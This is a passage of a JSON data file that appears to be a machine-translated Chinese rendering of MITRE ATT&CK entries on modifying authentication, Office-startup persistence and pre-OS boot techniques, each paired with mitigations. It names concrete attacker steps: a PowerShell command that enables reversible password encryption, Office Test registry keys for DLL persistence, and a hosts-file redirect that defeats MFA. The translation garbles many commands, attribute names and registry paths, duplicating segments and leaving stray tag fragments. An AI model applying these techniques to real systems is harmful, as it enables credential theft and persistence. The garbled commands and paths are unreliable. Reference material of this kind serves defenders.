              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户通过适当的特权分离（Ex selinux，grsecurity，apparmor等）修改PAM组件，并限制特权升级机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.004",
    "name": "Network Device Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用补丁系统图像来硬编码操作系统中的密码，从而绕过网络设备上本地帐户的本地身份验证机制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "修改系统映像可能包括向操作系统的网络设备的植入代码，以使用特定密码为对手提供访问权限。修改包括一个特定的密码，该密码通过补丁植入了操作系统图像。经过身份验证尝试后，插入的代码将首先检查以查看用户输入是否是密码。如果是这样，将授予访问权限。否则，植入的代码将通过凭据来验证潜在有效的凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备都支持TACACS+和/或半径。遵循供应商处方的最佳实践，以硬化访问控制。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循最少的特权原则，将管理员帐户限制在尽可能少的个人中。防止管理员和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台之间，例如服务器或端点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.005",
    "name": "Reversible Encryption",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Active Directory认证加密属性，以获取Windows系统上的凭据。"
        },
        {
          "type": "code",
          "content": "允许Reverversible passwordecryption "
        },
        {
          "type": "text",
          "content": "属性指定帐户的可逆密码加密是启用还是禁用。默认情况下，该属性被禁用（取而代之的是将用户凭据作为单向哈希功能的输出），除非旧版或其他软件都需要它，否则不应启用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果启用该属性并在启用密码后更改其密码，则对手可能能够在启用属性后获取创建/更改的密码的明文。要解密密码，对手需要四个组件："
        }
      ],
      [
        {
          "type": "text",
          "content": "有了这些信息，对手可能能够重现加密密钥，然后解密加密的密码值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过本地组策略编辑器，用户属性，细粒密码策略（FGPP）或通过Activedirectory PowerShell模块将此属性设置为各种范围。例如，如果域功能级别设置为“ Windows Server 2008”或更高版本，则对手可以实现并将FGPP应用于用户或组。在PowerShell中，对手可以使用类似于"
        },
        {
          "type": "code",
          "content": " Set -Aduser -AllowReversible passwordectryption $ true "
        },
        {
          "type": "text",
          "content": "的命令对用户设置进行关联更改。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保"
            },
            {
              "type": "code",
              "content": "允许Reverversible passwordectigning "
            },
            {
              "type": "text",
              "content": "将属性设置为禁用，除非有应用程序要求。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域和本地帐户以及其许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。如果启用了默认帐户，或者创建尚未授权的新本地帐户，这些审核也应包括在内。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.006",
    "name": "Multi-Factor Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会禁用或修改多因素身份验证（MFA）机制，以使持续访问受损害的帐户访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦对手通过损害缺乏MFA的帐户或采用MFA旁路方法（例如多因素身份验证请求生成生成）来获得对网络的访问，对手可能会利用其修改或完全禁用MFA防御的访问权限。这可以通过滥用合法功能来完成，例如将用户排除在Azure AD条件访问策略之外，注册新的但脆弱的/对手控制的MFA方法，或者通过手动修补MFA程序和配置文件来绕过预期的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，将Windows Hosts文件（"
        },
        {
          "type": "code",
          "content": " c：\\ Windows \\ System32 \\ eetc \\ etc hosts "
        },
        {
          "type": "text",
          "content": "）修改以将MFA调用重定向到Localhost而不是MFA服务器可能会导致MFA进程失败。如果制定“失败的打开”策略，则可以在无执行MFA的情况下授予任何其他成功的身份验证尝试。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据对手的范围，目标和特权，MFA防御可能会用于单个帐户或与较大群体相关的所有帐户，例如受害者网络环境中的所有域帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "查看MFA操作以及身份验证日志，以确保基于MFA的登录按预期运行。查看用户帐户，以确保所有帐户都启用了MFA。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "确保对现有，停用或休眠的帐户和设备的MFA和MFA政策和要求正确实施。如果可能的话，请考虑在发生严重错误的情况下将MFA解决方案配置为“失败”，而不是授予访问。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保实施适当的政策，以决定用户帐户的MFA的安全入学和停用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.007",
    "name": "Hybrid Identity",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修补，修改或以其他方式进行后门云身份验证过程，这些过程与本地用户身份相关，以绕过典型的身份验证机制，访问凭据，并启用对帐户的持续访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多组织维护在本地和基于云的环境之间共享的混合用户和设备身份。这些可以通过多种方式维护。例如，Azure AD包括三个用于同步Active Directory和Azure AD之间的身份的选项："
        }
      ],
      [
        {
          "type": "list",
          "content": "密码哈希同步（PHS），其中特权本地帐户同步了Active Directory和Azure AD之间的用户密码哈希，从而使Azure AD的身份验证完全在云中进行"
        },
        {
          "type": "list",
          "content": "通过身份验证（PTA），将Azure AD身份验证尝试转发给本地PTA代理，该代理验证了针对Active Directory的凭据"
        },
        {
          "type": "list",
          "content": "Active Directory Federation Services（AD FS），其中Active Directory和Azure AD之间建立了信任关系"
        }
      ],
      [
        {
          "type": "text",
          "content": "AD FS也可以与其他SaaS和云平台（如AWS和GCP）一起使用，AWS和GCP将把身份验证过程移交给AD FS并接收包含混合用户的身份和特权的令牌。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过修改与混合身份相关的身份验证过程，对手可能能够建立对云资源的持续特权访问。例如，损害运行PTA代理的本地服务器的对手可以将恶意DLL注入"
        },
        {
          "type": "code",
          "content": " azureadConnectAuthenticationAgenticagentservice "
        },
        {
          "type": "text",
          "content": "处理所有尝试对Azure AD进行身份验证的尝试，以及记录用户凭证。在使用AD FS的环境中，对手可以编辑"
        },
        {
          "type": "code",
          "content": " Microsoft.IdentityServer.ServiceHost "
        },
        {
          "type": "text",
          "content": "配置文件，以加载一个恶意DLL，该恶意DLL为任何具有任何索赔的用户生成身份验证令牌定义的AD FS政策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些情况下，对手可能能够从云中修改混合身份身份验证过程。例如，在Azure AD租户中妥协全局管理员帐户的对手可能能够通过Web控制台注册新的PTA代理，同样允许他们作为任何用户收获凭据并将其登录到Azure AD环境中。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期查看用于任何差异的混合身份解决方案。例如，查看Azure Management门户中的所有PTA代理，以识别任何不需要的或未批准的PTA代理。如果使用ADF，请在AD FS和全局汇编缓存目录中查看DLL和可执行文件，以确保它们由Microsoft签名。请注意，在某些情况下，二进制文件可能是符号签名的，这可能会导致该文件在查看文件属性时出现未签名。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制本地帐户，并访问了对混合身份解决方案的访问。例如，将Azure AD全局管理员帐户仅限于所需的帐户，并确保这些帐户是专用的仅云帐户而不是混合帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.008",
    "name": "Network Provider DLL",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以注册恶意网络提供商动态链接库（DLL），以在身份验证过程中捕获ClearText用户凭据。网络提供商DLL允许Windows与特定的网络协议交互，还可以支持附加凭据管理功能。在登录过程中，Winlogon（交互式登录模块）通过RPC将凭据发送到本地"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "过程。"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "过程然后在通知登录事件发生时与已注册的凭据管理者在ClearText中共享凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以配置恶意网络提供商DLL，以从"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "接收凭据。一旦安装为凭证管理器（通过注册表），恶意DLL每次用户通过"
        },
        {
          "type": "code",
          "content": " nplogonnotify（）"
        },
        {
          "type": "text",
          "content": "函数登录到Windows Workstation或域上时都可以接收并保存凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会针对已知增加登录活动和/或管理员登录活动（例如服务器和域控制器）的系统，以种植恶意网络提供商DLL为目标。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期审查注册表中的新的和未知的网络提供商DLL（"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ services \\ <networkProvidername> \\ networkProvider \\ networkProvider \\ provider \\ providerpath "
            },
            {
              "type": "text",
              "content": "）。"
            }
          ],
          [
            {
              "type": "text",
              "content": "确保仅注册有效的网络提供商DLL。这些名称可以在注册表密钥中找到"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ currentControlset \\ control \\ networkProvider \\ order \\ order </code </code "
            },
            {
              "type": "text",
              "content": " </code>，并且在"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ currentc ontrololset \\ currentc ontroloset controlsect ot trolsy \\ code subkey指向dll\\ services \\ <NetworkProviderName> \\ NetworkProvider "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "从Windows 11 22H2开始，可以通过组策略或通过配置服务提供商禁用"
            },
            {
              "type": "code",
              "content": " enablemprnotifications "
            },
            {
              "type": "text",
              "content": "策略，以防止Winlogon向网络提供商发送凭据。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "限制注册表权限，禁止修改敏感注册表密钥，例如"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ control \\ networkProvider \\ order \\ order \\ order "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1137.001",
    "name": "Office Template Macros",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Office Application Startup",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Microsoft Office模板，以获得受损系统的持久性。Microsoft Office包含的模板是普通办公应用程序的一部分，可用于自定义样式。每次应用程序启动时，都会使用应用程序中的基本模板。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Office Visual Basic for Applications（VBA）宏可以插入基本模板中，并在相应的Office应用程序启动以获得持久性时执行代码。已经发现和出版了Word和Excel的示例。默认情况下，Word具有一个正常的。创建的DOTM模板，可以修改以包括恶意宏。Excel没有默认情况下创建的模板文件，但是可以添加将自动加载的模板文件。共享模板也可以从远程位置存储并拉出。"
        }
      ],
      [
        {
          "type": "text",
          "content": "word normal.dotm位置："
        },
        {
          "type": "code",
          "content": " c：\\ users \\ <username> \\ appdata \\ roaming \\ microsoft \\ microsoft \\ templates \\ normal.dotm "
        },
        {
          "type": "text",
          "content": ""
        }
      ],
      [
        {
          "type": "text",
          "content": "excel personal.xlsb位置："
        },
        {
          "type": "code",
          "content": " c：\\ users \\ <username> \\ appdata \\ roaming \\ roaming \\ microsoft \\ excel \\ excel \\ xlstart \\ xlstart \\ personal.xls.xlsb "
        },
        {
          "type": "text",
          "content": ""
        }
      ],
      [
        {
          "type": "text",
          "content": "对手还可以通过劫持应用程序的搜索顺序，例如Word 2016将首先在"
        },
        {
          "type": "code",
          "content": " c：\\ Program Files（x86）\\ Microsoft Office \\ root \\ Office16 \\ "
        },
        {
          "type": "text",
          "content": "下首先查找normal.dotm，或通过修改GlobalDotName注册表密钥。通过修改“对手”可以指定将在应用程序启动上加载的模板使用的任意位置，文件名和文件扩展名。要滥用GlobalDotname，对手可能首先需要将模板注册为受信任的文档或将其放置在受信任的位置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能需要使宏取决于系统或使用宏的企业安全策略，执行不受限制。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止办公应用程序创建子进程并为磁盘编写潜在的恶意可执行内容。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "关注办公室宏观安全最佳实践，适合您的环境。禁用办公室VBA宏无法执行。"
            }
          ],
          [
            {
              "type": "text",
              "content": "禁用办公室加载项。如果需要它们，请遵循最佳实践，要求签署并禁用允许附加的用户通知来确保它们。对于某些附加类型（WLL，VBA），可能需要额外缓解，因为在Office Trust Center中禁用加载项不会禁用WLL，也不会阻止VBA代码执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1137.002",
    "name": "Office Test",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Office Application Startup",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Microsoft Office“ Office测试”注册表密钥，以获得对受损系统的持久性。存在Office测试注册表的位置，该位置允许用户指定每次启动Office应用程序时将执行的任意DLL。Microsoft认为此注册表密钥在开发Office应用程序时使用了DLL进行测试和调试目的。默认情况下，在办公室安装期间，该注册表密钥不会创建。"
        }
      ],
      [
        {
          "type": "text",
          "content": "有办公室测试功能的用户和全局注册表键："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_current_user \\ Software \\ Microsoft \\ Office Test \\ Special \\ Perf"
        },
        {
          "type": "list",
          "content": "HKEY_LOCAL_MACHINE \\ SOFTWORD \\ MICROSOFT \\ Office Test \\ Special \\ Perf"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以添加此注册表密钥，并指定一个恶意DLL，每当启动Word或Excel等办公应用程序时都将执行该密钥。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止办公应用程序创建子进程并为磁盘编写潜在的恶意可执行内容。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "创建用于执行它的注册表密钥并将权限设置为“读取控制”，以防止无需管理员权限或需要特权升级即可轻松访问密钥。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1137.003",
    "name": "Outlook Forms",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Office Application Startup",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Microsoft Outlook表格，以获得对损害系统的持久性。Outlook表单用作Outlook消息中的演示和功能的模板。可以创建自定义Outlook表单，该表格将通过使用相同的自定义Outlook表单发送专门精心设计的电子邮件时执行代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦将恶意表格添加到用户的邮箱中，将在Outlook启动时加载它们。当对手向用户发送专门制作的电子邮件时，恶意表格将执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止办公应用程序创建子进程并为磁盘编写潜在的恶意可执行内容。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "对于Outlook方法，阻止宏可能是无效的，因为用于这些功能的视觉基本引擎与宏脚本引擎分开。Microsoft已发布了修补程序，以尝试解决每个问题。确保KB3191938阻止Outlook Visual Basic并显示恶意代码警告，默认情况下禁用自定义表单的KB4011091，而KB4011162则将删除传统主页功能的KB4011162应用于系统。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1137.004",
    "name": "Outlook Home Page",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Office Application Startup",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Microsoft Outlook的主页功能，以获得受损系统的持久性。Outlook主页是一种旧功能，用于自定义Outlook文件夹的介绍。此功能允许每当打开文件夹时加载和外部URL。可以制作一个恶意的HTML页面，该页面将在Outlook Home Page加载时执行代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦将恶意主页添加到用户的邮箱中，将在Outlook启动时加载它们。当正确的Outlook文件夹加载/重新加载时，恶意主页将执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止办公应用程序创建子进程并为磁盘编写潜在的恶意可执行内容。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "对于Outlook方法，阻止宏可能是无效的，因为用于这些功能的视觉基本引擎与宏脚本引擎分开。Microsoft已发布了修补程序，以尝试解决每个问题。确保KB3191938阻止Outlook Visual Basic并显示恶意代码警告，默认情况下禁用自定义表单的KB4011091，而KB4011162则将删除传统主页功能的KB4011162应用于系统。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1137.005",
    "name": "Outlook Rules",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Office Application Startup",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Microsoft Outlook规则，以获得对妥协系统的持久性。Outlook规则允许用户定义自动行为以管理电子邮件。例如，良性规则可能会自动将电子邮件移至Outlook中的特定文件夹，如果它包含来自特定发件人的特定单词。可以创建恶意的Outlook规则，当对手向该用户发送专门精心设计的电子邮件时，可以触发代码执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦将恶意规则添加到用户的邮箱中，将在启动Outlook时加载它们。当对手向用户发送专门精心设计的电子邮件时，恶意规则将执行。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止办公应用程序创建子进程并为磁盘编写潜在的恶意可执行内容。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "对于Outlook方法，阻止宏可能是无效的，因为用于这些功能的视觉基本引擎与宏脚本引擎分开。Microsoft已发布了修补程序，以尝试解决每个问题。确保KB3191938阻止Outlook Visual Basic并显示恶意代码警告，默认情况下禁用自定义表单的KB4011091，而KB4011162则将删除传统主页功能的KB4011162应用于系统。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1137.006",
    "name": "Add-ins",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Office Application Startup",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Microsoft Office加载项，以获得遭受妥协的系统的持久性。办公加载项可用于为办公室程序添加功能。各种办公产品可以使用不同类型的加载项；包括Word/Excel附加库（WLL/XLL），VBA附加组件，Office组件对象模型（COM）附加组件，自动化加载项，VBA编辑器（VBE），Visual Studio for Office工具（VSTO）添加 -  ins和Outlook附加组件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用加载项来获得持久性，因为在Office应用程序启动时，可以将它们设置为执行代码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止办公应用程序创建子进程并为磁盘编写潜在的恶意可执行内容。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.001",
    "name": "System Firmware",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会修改系统固件以持续到系统上。BIOS（基本输入/输出系统）和统一的可扩展固件接口（UEFI）或可扩展的固件接口（EFI）是系统固件的示例，可作为操作系统之间的软件接口操作和计算机的硬件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "诸如BIOS和（U）EFI之类的系统固件的基础计算机功能，并且可以通过对手进行修改以执行或协助恶意活动。存在覆盖系统固件的功能，这可能会使精致的对手是安装恶意固件更新的手段，以此作为在可能难以检测到的系统上持久性的手段。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "检查现有的BIOS或EFI的完整性，以确定它是否容易受到修改。使用受信任的平台模块技术。将系统的信任根源移至硬件，以防止SPI闪存篡改。Intel Boot Guard等技术可以为此提供帮助。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "防止对手访问特权帐户或执行此技术所需的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "必要时修补BIOS和EFI。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.002",
    "name": "Component Firmware",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改组件固件以持续在系统上。一些对手可能会采用复杂的手段来损害计算机组件并安装恶意固件，以在操作系统和主系统固件或BIOS之外执行对手代码。该技术可能类似于系统固件，但在其他系统组件/设备上进行的功能可能没有相同的功能或完整性检查水平。"
        }
      ],
      [
        {
          "type": "text",
          "content": "尽管潜在的典型失败无法维护访问和硬盘重新形象，但恶意组件固件仍可以提供对系统的持续级别，也可以提供逃避基于主机软件的防御和完整性检查的方法。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "执行定期的固件更新，以减轻剥削和/或滥用的风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.003",
    "name": "Bootkit",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用靴子持续在系统上。靴子套件位于操作系统以下的一层，除非组织怀疑使用并可以采取相应的行动，否则可能很难执行完整的补救。"
        }
      ],
      [
        {
          "type": "text",
          "content": "BootKit是一种恶意软件变体，可修改硬盘驱动器的引导扇区，包括主启动记录（MBR）和音量启动记录（VBR）。MBR是BIOS完成硬件初始化后首先加载的磁盘部分。这是引导加载程序的位置。对启动驱动器的原始访问权限的对手可以覆盖此区域，将启动期间的执行从普通引导加载器转移到对手代码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "MBR将启动过程的控制权传递给VBR。与MBR的情况类似，对启动驱动器的原始访问的对手可以覆盖VBR在启动期间转移执行到对手代码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "使用受信任的平台模块技术和安全或受信任的启动过程，以防止系统完整性受到损害。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保获得适当的权限，以防止对手访问安装靴子所需的特权帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.004",
    "name": "ROMMONkit",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会通过加载未经授权的固件使用对手代码来滥用ROM监视器（Rommon），以提供持久的访问并操纵难以检测的设备行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Rommon是一种Cisco Network设备固件，可作为引导加载程序，启动图像或启动助手的功能，以便在平台上电动或重置时初始化硬件和软件。与TFTP启动类似，对手可以使用对手代码在本地或远程（例如通过TFTP）升级Rommon映像，并重新启动设备以覆盖现有的Rommon Image。这为对手提供了更新Rommon的方法，以可能难以检测的方式在系统上获得持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查系统图像的完整性，以确保其未经修改。"
            }
          ]
        ]
      },
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "启用安全引导功能，使用特殊用途硬件设备验证引导环境和系统映像的数字签名。如果验证检查失败，则该设备将无法启动防止未经授权的软件加载。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "使用网络签名来识别特定协议（例如TFTP）的流量，可以使用网络入侵检测和预防系统来减轻网络级别的活动。签名通常用于协议中的唯一指标，并且可能基于特定对手或工具使用的特定技术，并且在各种网络配置中可能会有所不同。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1542.005",
    "name": "TFTP Boot",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Pre-OS Boot",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用NetBooting从琐碎的文件传输协议（TFTP）服务器加载未经授权的网络设备操作系统。网络管理员通常使用TFTP启动（NetBooting）来加载配置控制的网络设备从中央管理服务器加载。NetBooting是引导序列中的一个选项，可用于集中，管理和控制设备图像。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以操纵网络设备上的配置，以指定使用恶意TFTP服务器的使用，该配置可以与修改系统图像一起使用，以在设备启动或重置上加载修改的图像。未经授权的图像允许对手修改设备配置，向设备添加恶意功能，并引入后门以维护网络设备的控制，同时通过使用标准功能最小化检测。该技术类似于RommonKit，可能会导致网络设备运行修改后的图像。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期检查运行配置和系统映像的完整性，以确保未修改它们。"
            }
          ]
        ]
      },
      {
        "id": "M1046",
        "name": "引导完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "启用安全引导功能，使用特殊用途硬件设备验证引导环境和系统映像的数字签名。如果验证检查失败，则该设备将无法启动防止未经授权的软件加载。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
